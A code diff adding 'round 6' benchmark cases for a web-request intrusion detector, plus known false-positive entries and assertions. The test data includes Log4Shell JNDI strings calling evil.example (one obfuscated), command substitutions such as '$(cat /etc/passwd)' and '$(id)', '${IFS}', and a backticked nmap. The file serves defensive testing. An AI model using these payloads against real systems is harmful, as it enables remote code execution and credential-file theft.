@@ -13,6 +13,7 @@ from guard_core.sync.handlers.suspatterns_handler import (
 )
 from guard_core.sync.utils import detect_penetration_attempt
 from tests.test_sus_patterns.test_detection_benchmark import (
+    _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON,
     _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
     _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
     _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
@@ -548,6 +549,60 @@ _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES: list[TargetedCase] = [
 ]
 
 
+_ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
+    TargetedCase(
+        "round6_log4shell_direct_ldap_query_param",
+        _query_param_request("${jndi:ldap://evil.example/a}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_lower_form_body",
+        _form_body_request("${${lower:j}ndi:ldap://evil.example/a}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_unambiguous_json_body",
+        _json_body_request("$(cat /etc/passwd)"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_brace_ifs_multipart_body",
+        _multipart_body_request("${IFS}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_ambiguous_bare_query_param",
+        _query_param_request("$(id)"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_ambiguous_bare_url_path",
+        _url_path_request("$(id)"),
+        True,
+    ),
+    TargetedCase(
+        "round6_dollar_paren_ambiguous_bare_raw_body_benign",
+        _raw_body_request("$(id)"),
+        False,
+    ),
+    TargetedCase(
+        "round6_sql_keyword_not_glued_no_longer_exempts_dollar_query_param",
+        _query_param_request("x$(id) JOIN accounts"),
+        True,
+    ),
+    TargetedCase(
+        "round6_sql_keyword_glued_no_space_still_exempts_dollar_query_param",
+        _query_param_request("SELECT$(id)FROM users"),
+        False,
+    ),
+    TargetedCase(
+        "round6_denylist_nmap_glued_backtick_raw_body",
+        _raw_body_request("x`nmap`"),
+        True,
+    ),
+]
+
+
 def _mechanism_for_index(mechanisms: tuple[str, ...], index: int) -> str:
     return mechanisms[index % len(mechanisms)]
 
@@ -590,6 +645,18 @@ _KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {
     ),
     "cmd_injection_value_bare_shell_control": (
         _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON
+    ),
+    "cmd_injection_jquery_selector_bare_id_call": (
+        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON
+    ),
+    "cmd_injection_jquery_selector_hash_id_call": (
+        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON
+    ),
+    "cmd_injection_js_template_dotted_prop": (
+        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON
+    ),
+    "cmd_injection_js_template_bare_var_brace": (
+        _AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON
     ),
 }
 
@@ -660,6 +727,12 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
         if result.is_threat != targeted.expect_detected:
             backtick_targeted_failures.append(targeted.case_id)
 
+    round6_targeted_failures: list[str] = []
+    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
+        result = detect_penetration_attempt(targeted.request, _CONFIG)
+        if result.is_threat != targeted.expect_detected:
+            round6_targeted_failures.append(targeted.case_id)
+
     wall_time_seconds = time.monotonic() - start
 
     report_lines = [
@@ -706,6 +779,15 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
             f"  {targeted.case_id}: expected={targeted.expect_detected}"
         )
     report_lines.append("")
+    report_lines.append(
+        "targeted round-6 command-substitution cases "
+        "(dollar-paren/brace, log4shell, sql-keyword-glue):"
+    )
+    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
+        report_lines.append(
+            f"  {targeted.case_id}: expected={targeted.expect_detected}"
+        )
+    report_lines.append("")
     report_lines.append("known end-to-end false positives (documented, still counted):")
     for case_id, reason in _KNOWN_E2E_FALSE_POSITIVES.items():
         report_lines.append(f"  {case_id}: {reason}")
@@ -714,6 +796,7 @@ def test_detect_penetration_attempt_recall_and_false_positive_rate() -> None:
 
     assert not targeted_failures, f"{targeted_failures}\n{report}"
     assert not backtick_targeted_failures, f"{backtick_targeted_failures}\n{report}"
+    assert not round6_targeted_failures, f"{round6_targeted_failures}\n{report}"
 
     assert malicious_detected >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
         f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
